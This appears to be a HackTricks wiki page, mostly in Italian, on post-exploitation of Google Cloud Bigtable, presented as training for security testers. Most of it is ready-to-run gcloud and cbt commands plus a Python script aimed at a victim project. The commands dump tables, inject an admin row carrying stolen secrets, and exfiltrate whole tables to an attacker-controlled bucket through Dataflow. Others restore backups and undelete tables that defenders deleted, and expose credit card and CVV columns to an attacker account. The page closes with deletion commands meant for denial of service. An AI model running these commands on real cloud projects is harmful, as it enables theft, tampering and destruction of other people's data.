# GCP - Bigtable Post Exploitation

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Per ulteriori informazioni su Bigtable, vedi:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

> [!TIP]
> Installa il `cbt` CLI una volta tramite il Cloud SDK in modo che i comandi sottostanti funzionino localmente:
>
> ```bash
> gcloud components install cbt
> ```

### Leggere righe

**Permessi:** `bigtable.tables.readRows`

`cbt` è incluso nel Cloud SDK e comunica con le admin/data APIs senza richiedere middleware. Puntalo sul progetto/istanza compromesso ed esporta le righe direttamente dalla tabella. Limita la scansione se vuoi solo dare un'occhiata.
```bash
# Install cbt
gcloud components update
gcloud components install cbt

# Read entries with creds of gcloud
cbt -project=<victim-proj> -instance=<instance-id> read <table-id>
```
### Scrivere righe

**Permessi:** `bigtable.tables.mutateRows`, (avrai bisogno di `bigtable.tables.readRows` per confermare la modifica).

Usa lo stesso strumento per upsert arbitrary cells. Questo è il modo più veloce per backdoor configs, drop web shells, o plant poisoned dataset rows.
```bash
# Inject a new row
cbt -project=<victim-proj> -instance=<instance-id> set <table> <row-key> <family>:<column>=<value>

cbt -project=<victim-proj> -instance=<instance-id> set <table-id> user#1337 profile:name="Mallory" profile:role="admin" secrets:api_key=@/tmp/stealme.bin

# Verify the injected row
cbt -project=<victim-proj> -instance=<instance-id> read <table-id> rows=user#1337
```
`cbt set` accetta raw bytes tramite la sintassi `@/path`, quindi puoi inviare compiled payloads o serialized protobufs esattamente come li aspettano i servizi downstream.

### Esporta righe nel tuo bucket

**Permessi:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

È possibile exfiltrate i contenuti di un'intera tabella in un bucket controllato dall'attacker lanciando un job Dataflow che streama le righe in un bucket GCS che controlli.

> [!NOTE]
> Nota che avrai bisogno del permesso `iam.serviceAccounts.actAs` su un SA con permessi sufficienti per eseguire l'export (per impostazione predefinita, se non indicato diversamente, verrà usato il default compute SA).
```bash
gcloud dataflow jobs run <job-name> \
--gcs-location=gs://dataflow-templates-us-<REGION>/<VERSION>/Cloud_Bigtable_to_GCS_Json \
--project=<PROJECT> \
--region=<REGION> \
--parameters=<PROJECT>,bigtableInstanceId=<INSTANCE_ID>,bigtableTableId=<TABLE_ID>,filenamePrefix=<PREFIX>,outputDirectory=gs://<BUCKET>/raw-json/ \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run dump-bigtable3 \
--gcs-location=gs://dataflow-templates-us-central1/latest/Cloud_Bigtable_to_GCS_Json \
--project=gcp-labs-3uis1xlx \
--region=us-central1 \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,filenamePrefix=prefx,outputDirectory=gs://deleteme20u9843rhfioue/raw-json/ \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
> [!NOTE]
> Switch the template to `Cloud_Bigtable_to_GCS_Parquet` or `Cloud_Bigtable_to_GCS_SequenceFile` if you want Parquet/SequenceFile outputs instead of JSON. The permissions are the same; only the template path changes.

### Importare righe

**Autorizzazioni:** `dataflow.jobs.create`, `resourcemanager.projects.get`, `iam.serviceAccounts.actAs`

È possibile importare il contenuto di un'intera tabella da un bucket controllato dall'attacker avviando un Dataflow job che scrive righe in un GCS bucket che controlli. Per questo l'attacker dovrà prima creare un file parquet con i dati da importare rispettando lo schema previsto. L'attacker potrebbe prima esportare i dati in formato parquet seguendo la tecnica precedente con l'impostazione `Cloud_Bigtable_to_GCS_Parquet` e aggiungere nuove voci nel file parquet scaricato



> [!NOTE]
> Nota che avrai bisogno del permesso `iam.serviceAccounts.actAs` su un SA con permessi sufficienti per eseguire l'export (per impostazione predefinita, se non diversamente indicato, verrà usato il default compute SA).
```bash
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=<REGION> \
--gcs-location=gs://dataflow-templates-<REGION>/<VERSION>>/GCS_Parquet_to_Cloud_Bigtable \
--project=<PROJECT> \
--parameters=bigtableProjectId=<PROJECT>,bigtableInstanceId=<INSTANCE-ID>,bigtableTableId=<TABLE-ID>,inputFilePattern=gs://<BUCKET>/import/bigtable_import.parquet \
--staging-location=gs://<BUCKET>/staging/

# Example
gcloud dataflow jobs run import-bt-$(date +%s) \
--region=us-central1 \
--gcs-location=gs://dataflow-templates-us-central1/latest/GCS_Parquet_to_Cloud_Bigtable \
--project=gcp-labs-3uis1xlx \
--parameters=bigtableProjectId=gcp-labs-3uis1xlx,bigtableInstanceId=avesc-20251118172913,bigtableTableId=prod-orders,inputFilePattern=gs://deleteme20u9843rhfioue/import/parquet_prefx-00000-of-00001.parquet \
--staging-location=gs://deleteme20u9843rhfioue/staging/
```
### Ripristino dei backup

**Permissions:** `bigtable.backups.restore`, `bigtable.tables.create`.

Un attacker con questi permessi può ripristinare un backup in una nuova tabella sotto il suo controllo per poter recuperare dati sensibili precedenti.
```bash
gcloud bigtable backups list --instance=<INSTANCE_ID_SOURCE> \
--cluster=<CLUSTER_ID_SOURCE>

gcloud bigtable instances tables restore \
--source=projects/<PROJECT_ID_SOURCE>/instances/<INSTANCE_ID_SOURCE>/clusters/<CLUSTER_ID>/backups/<BACKUP_ID> \
--async \
--destination=<TABLE_ID_NEW> \
--destination-instance=<INSTANCE_ID_DESTINATION> \
--project=<PROJECT_ID_DESTINATION>
```
### Ripristinare tabelle

**Autorizzazioni:** `bigtable.tables.undelete`

Bigtable supporta la soft-deletion con un periodo di grazia (tipicamente 7 giorni per impostazione predefinita). Durante questa finestra, un attaccante con il permesso `bigtable.tables.undelete` può ripristinare una tabella recentemente cancellata e recuperare tutti i suoi dati, accedendo potenzialmente a informazioni sensibili che si pensava fossero state distrutte.

This is particularly useful for:
- Recupero dei dati da tabelle cancellate dai difensori durante la risposta agli incidenti
- Accesso a dati storici eliminati intenzionalmente
- Invertire cancellazioni accidentali o malevole per mantenere la persistenza
```bash
# List recently deleted tables (requires bigtable.tables.list)
gcloud bigtable instances tables list --instance=<instance-id> \
--show-deleted

# Undelete a table within the retention period
gcloud bigtable instances tables undelete <table-id> \
--instance=<instance-id>
```
> [!NOTE]
> L'operazione undelete funziona solo entro il periodo di retention configurato (predefinito 7 giorni). Dopo la scadenza di questa finestra, la tabella e i suoi dati vengono eliminati definitivamente e non possono essere recuperati tramite questo metodo.


### Crea viste autorizzate

**Permessi:** `bigtable.authorizedViews.create`, `bigtable.tables.readRows`, `bigtable.tables.mutateRows`

Le viste autorizzate consentono di presentare un sottoinsieme curato della tabella. Invece di rispettare il least privilege, usale per pubblicare **esattamente gli insiemi di colonne/righe sensibili** che ti interessano e whitelistare il tuo principal.

> [!WARNING]
> Il punto è che per creare una vista autorizzata devi anche poter leggere e mutare le righe nella tabella di base; quindi non ottieni permessi aggiuntivi e questa tecnica è per lo più inutile.
```bash
cat <<'EOF' > /tmp/credit-cards.json
{
"subsetView": {
"rowPrefixes": ["acct#"],
"familySubsets": {
"pii": {
"qualifiers": ["cc_number", "cc_cvv"]
}
}
}
}
EOF

gcloud bigtable authorized-views create card-dump \
--instance=<instance-id> --table=<table-id> \
--definition-file=/tmp/credit-cards.json

gcloud bigtable authorized-views add-iam-policy-binding card-dump \
--instance=<instance-id> --table=<table-id> \
--member='user:<attacker@example.com>' --role='roles/bigtable.reader'
```
Poiché l'accesso è limitato alla view, i difensori spesso trascurano il fatto che hai appena creato un nuovo endpoint ad alta sensibilità.

### Leggere Authorized Views

**Permessi:** `bigtable.authorizedViews.readRows`

Se hai accesso a un Authorized View, puoi leggere i dati da esso usando le librerie client di Bigtable specificando il nome dell'authorized view nelle tue richieste di lettura. Nota che l'authorized view probabilmente limiterà ciò a cui puoi accedere dalla tabella. Di seguito è riportato un esempio in Python:
```python
from google.cloud import bigtable
from google.cloud.bigtable_v2 import BigtableClient as DataClient
from google.cloud.bigtable_v2 import ReadRowsRequest

# Set your project, instance, table, view id
PROJECT_ID = "gcp-labs-3uis1xlx"
INSTANCE_ID = "avesc-20251118172913"
TABLE_ID = "prod-orders"
AUTHORIZED_VIEW_ID = "auth_view"

client = bigtable.Client(project=PROJECT_ID, admin=True)
instance = client.instance(INSTANCE_ID)
table = instance.table(TABLE_ID)

data_client = DataClient()
authorized_view_name = f"projects/{PROJECT_ID}/instances/{INSTANCE_ID}/tables/{TABLE_ID}/authorizedViews/{AUTHORIZED_VIEW_ID}"

request = ReadRowsRequest(
authorized_view_name=authorized_view_name
)

rows = data_client.read_rows(request=request)
for response in rows:
for chunk in response.chunks:
if chunk.row_key:
row_key = chunk.row_key.decode('utf-8') if isinstance(chunk.row_key, bytes) else chunk.row_key
print(f"Row: {row_key}")
if chunk.family_name:
family = chunk.family_name.value if hasattr(chunk.family_name, 'value') else chunk.family_name
qualifier = chunk.qualifier.value.decode('utf-8') if hasattr(chunk.qualifier, 'value') else chunk.qualifier.decode('utf-8')
value = chunk.value.decode('utf-8') if isinstance(chunk.value, bytes) else str(chunk.value)
print(f"  {family}:{qualifier} = {value}")
```
### Denial of Service tramite operazioni di eliminazione

**Permessi:** `bigtable.appProfiles.delete`, `bigtable.authorizedViews.delete`, `bigtable.authorizedViews.deleteTagBinding`, `bigtable.backups.delete`, `bigtable.clusters.delete`, `bigtable.instances.delete`, `bigtable.tables.delete`

Qualsiasi dei permessi di eliminazione di Bigtable può essere sfruttato per attacchi denial of service. Un attaccante con questi permessi può interrompere le operazioni cancellando risorse critiche di Bigtable:

- **`bigtable.appProfiles.delete`**: Elimina i profili applicazione, interrompendo le connessioni dei client e le configurazioni di routing
- **`bigtable.authorizedViews.delete`**: Rimuove le viste autorizzate, interrompendo i percorsi di accesso legittimi per le applicazioni
- **`bigtable.authorizedViews.deleteTagBinding`**: Rimuove le associazioni di tag dalle viste autorizzate
- **`bigtable.backups.delete`**: Cancella gli snapshot di backup, eliminando le opzioni di disaster recovery
- **`bigtable.clusters.delete`**: Elimina interi cluster, causando immediata indisponibilità dei dati
- **`bigtable.instances.delete`**: Rimuove intere istanze Bigtable, cancellando tutte le tabelle e le configurazioni
- **`bigtable.tables.delete`**: Elimina singole tabelle, causando perdita di dati e malfunzionamenti delle applicazioni
```bash
# Delete a table
gcloud bigtable instances tables delete <table-id> \
--instance=<instance-id>

# Delete an authorized view
gcloud bigtable authorized-views delete <view-id> \
--instance=<instance-id> --table=<table-id>

# Delete a backup
gcloud bigtable backups delete <backup-id> \
--instance=<instance-id> --cluster=<cluster-id>

# Delete an app profile
gcloud bigtable app-profiles delete <profile-id> \
--instance=<instance-id>

# Delete a cluster
gcloud bigtable clusters delete <cluster-id> \
--instance=<instance-id>

# Delete an entire instance
gcloud bigtable instances delete <instance-id>
```
> [!WARNING]
> Le operazioni di eliminazione sono spesso immediate e irreversibili. Assicurati che esistano backup prima di testare questi comandi, poiché possono causare perdita permanente di dati e gravi interruzioni del servizio.

{{#include ../../../banners/hacktricks-training.md}}
